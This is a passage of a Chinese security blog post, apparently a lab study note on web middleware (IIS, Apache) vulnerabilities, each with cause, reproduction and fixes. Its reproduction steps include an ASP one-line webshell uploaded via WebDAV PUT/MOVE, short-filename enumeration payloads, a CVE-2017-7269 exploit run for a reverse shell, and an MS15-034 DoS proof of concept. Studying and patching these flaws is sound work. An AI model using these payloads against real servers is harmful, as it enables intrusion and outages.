<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="常见的中间件, 晓莎K&#39;s blog">
    <meta name="description" content="中间件漏洞

概述中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。 
中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>常见的中间件 | 晓莎K&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.2">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="晓莎K's blog" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">晓莎K&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">晓莎K&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/0x00xiaoshaK" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/0x00xiaoshaK" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">常见的中间件</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
        background-color: rgb(255, 255, 255,0.7);
        border-radius: 10px;
        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
    }


    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
    height: calc(100vh - 250px);
    overflow: scroll;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
                                <span class="chip bg-color">中间件</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
                                漏洞
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-12-09
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    10.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    43 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><span id="more"></span>

<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。 </p>
<p>中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。</p>
<p>容器就是中间件 的一种。 </p>
<p>也就是说，关于中间件，我们可以理解为：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）</p>
<p>我们经常管web中间件叫做web服务器或者web容器</p>
<h2 id="常见的web中间件"><a href="#常见的web中间件" class="headerlink" title="常见的web中间件"></a>常见的web中间件</h2><blockquote>
<p>iis </p>
<p>apache </p>
<p>tomcat </p>
<p>nginx </p>
<p>jboss </p>
<p>Weblogic </p>
<p>WebSphere</p>
</blockquote>
<h2 id="iis6x"><a href="#iis6x" class="headerlink" title="iis6x"></a>iis6x</h2><h3 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p>
<p>影响版本：IIS 6.0</p>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>查看靶机的iis管理器，开启webDAV和网站的写入权限</p>
<p><img src="/2021/12/09/day36/image-20211221154157188.png" alt="image-20211221154157188"></p>
<p><img src="/2021/12/09/day36/image-20211221154231260.png" alt="image-20211221154231260"></p>
<p>接着我们用burp抓包</p>
<p><img src="/2021/12/09/day36/image-20211221154407120.png" alt="image-20211221154407120"></p>
<p>将GET改为OPTIONS提交，查看所支持的协议</p>
<p><img src="/2021/12/09/day36/image-20211221154443454.png" alt="image-20211221154443454"></p>
<p>可以看到支持PUT协议</p>
<p>接下来思路是，先用PUT协议创建一个txt文件，文件中写入asp一句话，再用MOVE修改文件名为asp后缀，这样脚本就能被解析执行</p>
<pre class="line-numbers language-none"><code class="language-none">PUT /test.txt HTTP/1.1 
Host: upload.moonteam.com 
Content-Length: 25 

&lt;%eval request("cmd")%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211221154922672.png" alt="image-20211221154922672"></p>
<p><img src="/2021/12/09/day36/image-20211221155047849.png" alt="image-20211221155047849"></p>
<p>test.txt创建成功</p>
<pre class="line-numbers language-none"><code class="language-none">MOVE /test.txt HTTP/1.1 
Host: upload.moonteam.com 
Destination: http://upload.moonteam.com/shell.asp

 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211221155408459.png" alt="image-20211221155408459"></p>
<p><img src="/2021/12/09/day36/image-20211221155427224.png" alt="image-20211221155427224"></p>
<p>可以看到test.txt成功被改为shell.asp了</p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ol>
<li>关闭webdav</li>
<li>关闭写入权限</li>
</ol>
<h3 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h3><h4 id="基于文件名"><a href="#基于文件名" class="headerlink" title="基于文件名"></a>基于文件名</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 ; 号及其后面的内容，相当于截断。</p>
<p>iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p>
<p>我们在主目录配置下看到这几个扩展名    都执行同asp一样的文件<strong>C:\WINDOWS\system32\inetsrv\asp.dll</strong>，所以都被解析成asp</p>
<p><img src="/2021/12/09/day36/image-20211221160219223.png" alt="image-20211221160219223"></p>
<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>我们上传或者创建文件，格式为*.asp;.jpg</p>
<p>我们在这里准备一个后门，sb.asp;1.jpg</p>
<p><img src="/2021/12/09/day36/image-20211221160656193.png" alt="image-20211221160656193"></p>
<p><img src="/2021/12/09/day36/image-20211221160729522.png" alt="image-20211221160729522"></p>
<h5 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h5><ol>
<li>禁止上传或常见此类畸形文件</li>
<li>图片存放的目录禁止执行脚本文件</li>
<li>升级iis版本 </li>
</ol>
<h4 id="基于文件夹"><a href="#基于文件夹" class="headerlink" title="基于文件夹"></a>基于文件夹</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>该版本默认将*.asp/目录下的所有文件当作asp解析</p>
<h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>创建.asp文件夹，将图片后门格式放到此文件夹</p>
<p><img src="/2021/12/09/day36/image-20211221161049625.png" alt="image-20211221161049625"></p>
<p><img src="/2021/12/09/day36/image-20211221161217840.png" alt="image-20211221161217840"></p>
<p>看到图片格式的后门也作为asp解析了</p>
<h5 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h5><ol>
<li>进制常见此类文件夹</li>
<li>升级iis版本</li>
</ol>
<h3 id="iis短文件漏洞"><a href="#iis短文件漏洞" class="headerlink" title="iis短文件漏洞"></a>iis短文件漏洞</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位Windows的程序访问这些文件。</p>
<p>在cmd下输入”dir /x”即可看到短文件名的效果。</p>
<p><img src="/2021/12/09/day36/image-20211222105843497.png" alt="image-20211222105843497"></p>
<h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p>
<p>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p>
<p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六 种</p>
<p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p>
<h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><blockquote>
<p> IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;=8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。</p>
</blockquote>
<p>我们这里开启IIS6.0 ASP.NET</p>
<p><img src="/2021/12/09/day36/image-20211222110144084.png" alt="image-20211222110144084"></p>
<p>短文件名特征：</p>
<ol>
<li><p>.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的6个字符是相同的,后面的数字进行递增</p>
<p><img src="/2021/12/09/day36/image-20211222111521319.png" alt="image-20211222111521319"></p>
</li>
<li><p>后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断。<img src="/2021/12/09/day36/image-20211222111649177.png" alt="image-20211222111649177"></p>
</li>
<li><p>所有小写字母均转换成大写的字母</p>
</li>
<li><p>长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀<img src="/2021/12/09/day36/image-20211222111746912.png" alt="image-20211222111746912"></p>
</li>
<li><p>长文件名前缀/文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包含空格或者其他部分特殊字符,不论长度均会生成短文件。<img src="/2021/12/09/day36/image-20211222112413873.png" alt="image-20211222112413873"></p>
</li>
</ol>
<h5 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h5><p>使用payload验证目标是否存在IIS短文件名漏洞</p>
<p>*可以匹配0或多个字符</p>
<pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211222112837069.png" alt="image-20211222112837069"></p>
<p>显示的404,说明目标存在该短文件名</p>
<pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/zzzzzz*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211222112957864.png" alt="image-20211222112957864"></p>
<p>如果访问不存在的短文件名，会返回 Bad Request，说明文件不存在</p>
<p>我们通过这俩个payload，可以验证是否存在短文件漏洞，证明存在之后就要手工猜解出文件名</p>
<p>假如我们猜解的为abcde1231111.txt文件，他的前缀大于9位显然是个短文件</p>
<pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/a*~1*/a.aspx
http://upload.moonteam.com/b*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211222113702910.png" alt="image-20211222113702910"></p>
<p><img src="/2021/12/09/day36/image-20211222113710046.png" alt="image-20211222113710046"></p>
<p>这俩张截图可以看出猜解的文件是以a开头的，接下来继续</p>
<pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/ab*~1*/a.aspx
http://upload.moonteam.com/abc*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这样逐渐猜解出文件名，猜解出文件名之后，我们需要知道此文件名所代表的是文件还是文件夹</p>
<pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/abcde*~1.a*/a.aspx
http://upload.moonteam.com/abcde*~1.t*/a.aspx
http://upload.moonteam.com/abcde*~1.txt*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211222114058310.png" alt="image-20211222114058310"></p>
<p>这样就知道他所代表的是一个txt的文件</p>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p>像上面这种猜解比较费时间，我们可以寻找短文件名工具来提高效率</p>
<p><img src="/2021/12/09/day36/image-20211222114331821.png" alt="image-20211222114331821"></p>
<p>放到kali里</p>
<pre class="line-numbers language-none"><code class="language-none">python iis_shortname_Scan.py http://upload.moonteam.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211222114437099.png" alt="image-20211222114437099"></p>
<h4 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>升级.net framework</p>
</li>
<li><p>修改注册表的键值</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</p>
<p>修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。</p>
<p>命令行关闭 执行fsutil behavior set disable8dot3 1，也可达到同样效果</p>
</li>
</ol>
<p>win+r regedit</p>
<p><img src="/2021/12/09/day36/image-20211222114935630.png" alt="image-20211222114935630"></p>
<p>改为1之后，重启可以生效，这样创建出来的文件不会是短文件</p>
<p>但是已经存在的短文件无法移除，需要重新拷贝到另一个地方，删除原来的，再重命名回原来的名字，这样才会生效</p>
<h3 id="iis-RCE-CVE-2017-7269"><a href="#iis-RCE-CVE-2017-7269" class="headerlink" title="iis RCE-CVE-2017-7269"></a>iis RCE-CVE-2017-7269</h3><p>iis6.0的远程代码执行</p>
<h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>Microsoft windows Server 2003 R2中的 Internet信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数存在缓冲区溢出，允许远程攻击者通过以 If:&lt;http:// 开头的长标头执行任意代码 PROPFIND请求</p>
<p>影响版本：WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p>
<h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p><img src="/2021/12/09/day36/image-20211222140628107.png" alt="image-20211222140628107"></p>
<p>首先，我们此exp下载下来</p>
<p>下载前先再虚拟机把代理挂上</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载好exp后，我们看下目标的ip</p>
<p><img src="/2021/12/09/day36/image-20211222143830594.png" alt="image-20211222143830594"></p>
<pre class="line-numbers language-none"><code class="language-none">python iis6exp 192.168.80.129 80 192.168.80.128 1234 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211222144858973.png" alt="image-20211222144858973"></p>
<p>这里看到已经弹shell，ip已经是目标的ip了</p>
<h4 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h4><ol>
<li>关闭webDAV服务</li>
<li>升级</li>
<li>部署安全设备</li>
</ol>
<h2 id="iis7x"><a href="#iis7x" class="headerlink" title="iis7x"></a>iis7x</h2><h3 id="iis7x文件解析漏洞"><a href="#iis7x文件解析漏洞" class="headerlink" title="iis7x文件解析漏洞"></a>iis7x文件解析漏洞</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg/png后面加上/.php，会将a001.jpg/png解析为php文件</p>
<h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>我们上传图片到网站根目录，访问它</p>
<p><img src="/2021/12/09/day36/image-20211223101303731.png" alt="image-20211223101303731"></p>
<p>看到此图片没有作为php解析，这时我们在其后加上/.php</p>
<p><img src="/2021/12/09/day36/image-20211223101402872.png" alt="image-20211223101402872"></p>
<p>看到图片做为php解析了</p>
<h4 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>再phpini中配置 cgi fix_pathinfo=0 重启phpcgi</p>
</li>
<li><p>再iis管理中的处理程序映射中修改请求限制，打勾即可</p>
<p><img src="/2021/12/09/day36/image-20211223102152654.png" alt="image-20211223102152654"></p>
<p>这样就不会造成解析漏洞<img src="/2021/12/09/day36/image-20211223102244348.png" alt="image-20211223102244348"></p>
</li>
</ol>
<h3 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h3><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p>HTTP.SYS是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.SYS</p>
<p>HTTP.SYS远程代码执行漏洞实质是<strong>HTTP.SYS的整数溢出漏洞</strong>，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
<p>主要存在Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2/Server2012/Server 2012 R2以及Windows 7/8/8.1操作系统都受到这个漏洞的影响</p>
<p>影响范围：Windows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和Windows server 2012 R2</p>
<p>影响版本：IIS7.5、IIS8.0、IIS8.5</p>
<h4 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h4><p>我们访问此靶机网站</p>
<p><img src="/2021/12/09/day36/image-20211223102848264.png" alt="image-20211223102848264"></p>
<p>抓包后编辑，增加字段 Range: bytes=0-18446744073709551615，若返回码状态为416 RequestedRange Not Satisfiable，则存在HTTP.SYS远程代码执行漏洞。</p>
<p>直接增加字段为304，我们删除一些包信息</p>
<p><img src="/2021/12/09/day36/image-20211223103111584.png" alt="image-20211223103111584"></p>
<p><img src="/2021/12/09/day36/image-20211223103128619.png" alt="image-20211223103128619"></p>
<p>说明存在HTTP.SYS远程代码执行漏洞</p>
<p>我们下载poc，做一个dos的效果</p>
<pre class="line-numbers language-none"><code class="language-none">https://github.com/davidjura/MS15-034-IIS-Active-DoS-Exploit-PoC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>kali上拉取此poc</p>
<p><img src="/2021/12/09/day36/image-20211223103751108.png" alt="image-20211223103751108"></p>
<p>运行脚本，填补信息</p>
<p><img src="/2021/12/09/day36/image-20211223104146812.png" alt="image-20211223104146812"></p>
<p>返回靶机看到已经蓝屏了</p>
<p><img src="/2021/12/09/day36/image-20211223104119971.png" alt="image-20211223104119971"></p>
<p>达到了dos的效果</p>
<h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>打补丁，KB3042553</p>
<h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><p>Apache 是世界使用排名第一的 Web 服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。</p>
<p>apache的目录结构</p>
<pre class="line-numbers language-none"><code class="language-none">bin：存放常用命令工具，如httpd 
cgi-bin：存放linux下常用命令，如xxx.sh 
error：错误记录 
htdocs：网站源码 
icons：网站图标 
manual：手册 
modules：扩展模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h3><h4 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4><p>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。</p>
<h4 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h4><p>假如上传了一个a.php.qqq，依照此特性，.qqq不认识，继续向左解析，.php认识，就会被解析为php文件。</p>
<p>关于apache，不在mime.types文件中的都不认识</p>
<p><img src="/2021/12/09/day36/image-20211223153503138.png" alt="image-20211223153503138"></p>
<ol>
<li> 使用module模式与php结合的所有版本apache存在此漏洞。</li>
